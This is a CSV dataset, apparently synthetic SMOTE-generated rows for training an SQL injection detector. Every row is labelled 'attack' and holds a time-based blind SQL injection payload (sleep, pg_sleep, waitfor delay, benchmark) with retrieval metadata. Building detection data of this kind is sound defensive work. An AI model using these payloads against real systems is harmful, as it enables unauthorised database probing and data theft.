id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000172,attack,time,1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000047,0.5808519998684402
SMOTE_000173,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000215,0.4563877593133512
SMOTE_000174,attack,time,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000255,0.012040961955298798
SMOTE_000175,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000173,1.1638544033416622
SMOTE_000176,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",nearest_attack_euclidean,R000077,1.0706035447438513
SMOTE_000177,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000161,0.19845510673861963
SMOTE_000178,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000311,0.3390860318070397
SMOTE_000179,attack,time,"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000240,1.0468821723283392
SMOTE_000180,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000293,0.037260187372316796
SMOTE_000181,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000126,0.10539429122533257
SMOTE_000182,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,nearest_attack_euclidean,R000285,0.8222487863871623
SMOTE_000183,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R000224,0.5045586933121169
SMOTE_000184,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000119,0.9960651278433406
SMOTE_000185,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000031,1.236179543979103
SMOTE_000186,attack,time,"1"" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000222,0.5430337835576131
SMOTE_000187,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000045,0.8138146083381765
SMOTE_000188,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000057,0.07743897815130633
SMOTE_000189,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  acdk  )  #,nearest_attack_euclidean,R000221,0.4937235235677717
SMOTE_000190,attack,time,"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000089,0.32520568723931026
SMOTE_000191,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000099,0.012612329758344823
SMOTE_000192,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000022,0.03258566474614434
SMOTE_000193,attack,time,"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",nearest_attack_euclidean,R000279,1.448153182442796
SMOTE_000194,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000188,2.3573047591266763
SMOTE_000195,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000100,1.669359945105519
SMOTE_000196,attack,time,"1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000184,0.7294118318940183
SMOTE_000197,attack,time,"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000213,0.11818375132456074
SMOTE_000198,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000053,0.36973330232510365
SMOTE_000199,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",nearest_attack_euclidean,R000249,0.3578360156465493
SMOTE_000200,attack,time,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000225,0.9595105041806793
SMOTE_000201,attack,time,1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000241,0.2511659475928937
SMOTE_000202,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000188,0.9378649074990952
SMOTE_000203,attack,time,"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000176,0.07585004502594345
SMOTE_000204,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000204,0.2824544987750058
SMOTE_000205,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000005,0.32690956305968993
SMOTE_000206,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000232,0.5711208073962766
SMOTE_000207,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000287,1.097585085379811
SMOTE_000208,attack,time,"1""  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --",nearest_attack_euclidean,R000114,0.37991124780387336
SMOTE_000209,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000294,1.1590088698214969
SMOTE_000210,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000172,0.9551058196015473
SMOTE_000211,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000044,1.592607751283637
SMOTE_000212,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000036,0.7897572742254648
SMOTE_000213,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000127,1.5557962601825845
SMOTE_000214,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000190,0.03104444218462172
SMOTE_000215,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000162,0.968000182433341
SMOTE_000216,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000023,0.16225733620197078
SMOTE_000217,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000004,1.2823217874759205
SMOTE_000218,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000190,0.1387433657532738
SMOTE_000219,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000302,0.07572125338696259
SMOTE_000220,attack,time,select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,nearest_attack_euclidean,R000277,1.2929799772674901
SMOTE_000221,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000271,0.39103891548873976
SMOTE_000222,attack,time,"1""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000130,0.201034137228737
SMOTE_000223,attack,time,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000139,0.6273969650638626
SMOTE_000224,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000160,0.10162066724701803
SMOTE_000225,attack,time,1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000248,0.4461182946260955
SMOTE_000226,attack,time,"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000261,0.7409558601730264
SMOTE_000227,attack,time,"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000218,0.4432585394160143
SMOTE_000228,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000281,0.5446477170634062
SMOTE_000229,attack,time,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000233,1.049182744271372
SMOTE_000230,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000181,0.16352296861103158
SMOTE_000231,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000183,0.21038002914795867
SMOTE_000232,attack,time,"1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000184,0.446684995961619
SMOTE_000233,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000082,0.48361804430135796
SMOTE_000234,attack,time,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000290,0.7900443929072526
SMOTE_000235,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000074,2.263892657035436
SMOTE_000236,attack,time,1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000128,0.12936165612546818
SMOTE_000237,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000162,0.14602428944217624
SMOTE_000238,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000195,1.1944014975861224
SMOTE_000239,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000256,1.0229173907909748
SMOTE_000240,attack,time,1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000201,2.2733867020915084
SMOTE_000241,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000095,0.6211733718958723
SMOTE_000242,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000284,0.22086428081480858
SMOTE_000243,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000258,0.1230168127272476
SMOTE_000244,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.0011956680049800196
SMOTE_000245,attack,time,"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000069,0.05500696474298282
SMOTE_000246,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000282,0.10677551730052047
SMOTE_000247,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000165,0.10204464328598713
SMOTE_000248,attack,time,"1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000184,1.7825927272762194
SMOTE_000249,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000099,0.9289980025105049
SMOTE_000250,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000302,0.9115545938389876
SMOTE_000251,attack,time,"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000069,0.4488019405094972
SMOTE_000252,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R000273,1.3420677293682772
SMOTE_000253,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',nearest_attack_euclidean,R000266,0.35041854555650365
SMOTE_000254,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000007,0.4742263511587082
SMOTE_000255,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000199,0.11025283493603508
SMOTE_000256,attack,time,"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000297,0.8808113348199308
SMOTE_000257,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000195,0.9912877029340561
SMOTE_000258,attack,time,"1%""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000275,0.3649232011537563
SMOTE_000259,attack,time,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000225,0.30444190595371357
SMOTE_000260,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000287,0.22383184930341718
SMOTE_000261,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R000182,0.627729114832245
SMOTE_000262,attack,time,"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000246,0.005767672935479568
SMOTE_000263,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000195,2.113640395894134
SMOTE_000264,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000082,0.4090323984255899
SMOTE_000265,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",nearest_attack_euclidean,R000135,1.3689667757991815
SMOTE_000266,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000070,0.051782274492597834
SMOTE_000267,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000033,0.02017249303842868
SMOTE_000268,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,1.392327249079835
SMOTE_000269,attack,time,"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",nearest_attack_euclidean,R000109,0.2217497049604536
SMOTE_000270,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000256,2.1274264210248317
SMOTE_000271,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000276,0.32641843378817476
SMOTE_000272,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000190,0.8260405546391165
SMOTE_000273,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000204,1.9404983984997568
SMOTE_000274,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000193,1.4129991030932905
SMOTE_000275,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,nearest_attack_euclidean,R000285,0.2182162791740242
SMOTE_000276,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000208,0.0935175101458338
SMOTE_000277,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000141,1.8055295122292923
SMOTE_000278,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000170,0.10851926611412277
SMOTE_000279,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd",nearest_attack_euclidean,R000302,0.9462921310219854
SMOTE_000280,attack,time,"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000176,0.029233912490177483
SMOTE_000281,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000282,0.7879063815139723
SMOTE_000282,attack,time,1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000264,0.4292649406526706
SMOTE_000283,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000046,0.6204604026106546
SMOTE_000284,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000186,0.9741180544334329
SMOTE_000285,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000161,0.7353393390807074
SMOTE_000286,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000108,0.7818733146087425
SMOTE_000287,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,nearest_attack_euclidean,R000285,1.2353286994169577
SMOTE_000288,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",nearest_attack_euclidean,R000077,0.06143262086691897
SMOTE_000289,attack,time,"1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000308,1.006293734476118
SMOTE_000290,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000070,0.42501092813605296
SMOTE_000291,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000212,1.2355494165590977
SMOTE_000292,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000014,0.9818475410990064
SMOTE_000293,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',nearest_attack_euclidean,R000266,0.4584800869465032
SMOTE_000294,attack,time,1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000248,0.3255619775888059
SMOTE_000295,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000132,0.28090788222237534
SMOTE_000296,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000177,1.7943293890671723
SMOTE_000297,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R000295,0.3680197635256752
SMOTE_000298,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000081,0.47987093916538387
SMOTE_000299,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000284,1.2991018403549657
SMOTE_000300,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R000224,2.3930487769018507
SMOTE_000301,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000254,0.4170025813848181
SMOTE_000302,attack,time,1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000121,0.014577732700017219
SMOTE_000303,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000138,0.4518047928244013
SMOTE_000304,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000132,1.6888361671861465
SMOTE_000305,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000173,0.8627201183911032
SMOTE_000306,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,1.4406575003932363
SMOTE_000307,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000305,0.19996243077340636
SMOTE_000308,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000303,1.3487951096410082
SMOTE_000309,attack,time,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",nearest_attack_euclidean,R000146,0.5345805762452903
SMOTE_000310,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000238,0.6161577616385215
SMOTE_000311,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000188,0.6250996618668417
SMOTE_000312,attack,time,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",nearest_attack_euclidean,R000146,0.4045815950370464
SMOTE_000313,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000053,0.30247334028713435
SMOTE_000314,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000101,1.2544231599055053
SMOTE_000315,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000159,1.0620074854557227
SMOTE_000316,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000007,0.32440370917745603
SMOTE_000317,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000281,0.5953312442381692
SMOTE_000318,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000162,0.014941172004648064
SMOTE_000319,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000112,0.39039391119261796
SMOTE_000320,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000112,1.0079662679806705
SMOTE_000321,attack,time,1   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000309,1.4831977629862922
SMOTE_000322,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,nearest_attack_euclidean,R000049,0.6960839517722246
SMOTE_000323,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000070,0.11288312850253487
SMOTE_000324,attack,time,"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000297,0.8426353159676861
SMOTE_000325,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000267,0.23027183680472965
SMOTE_000326,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000232,1.0947221918927084
SMOTE_000327,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000091,0.4080673572785807
SMOTE_000328,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000311,1.4053975228378774
SMOTE_000329,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000236,0.11466532466362646
SMOTE_000330,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,nearest_attack_euclidean,R000272,0.9930235899193028
SMOTE_000331,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000208,0.031902073304316034
SMOTE_000332,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000287,0.25563121786841264
SMOTE_000333,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000078,2.0130097643566587
SMOTE_000334,attack,time,"1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000116,1.6791731674722794
SMOTE_000335,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R000287,1.2674270992423768
SMOTE_000336,attack,time,"1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000307,0.7058822282538862
SMOTE_000337,attack,time,"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000218,0.2213732646935684
SMOTE_000338,attack,time,"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000069,1.0702139686144927
SMOTE_000339,attack,time,"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000091,0.6825900201173555
SMOTE_000340,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000155,0.5354725496699044
SMOTE_000341,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000055,1.215943952820624
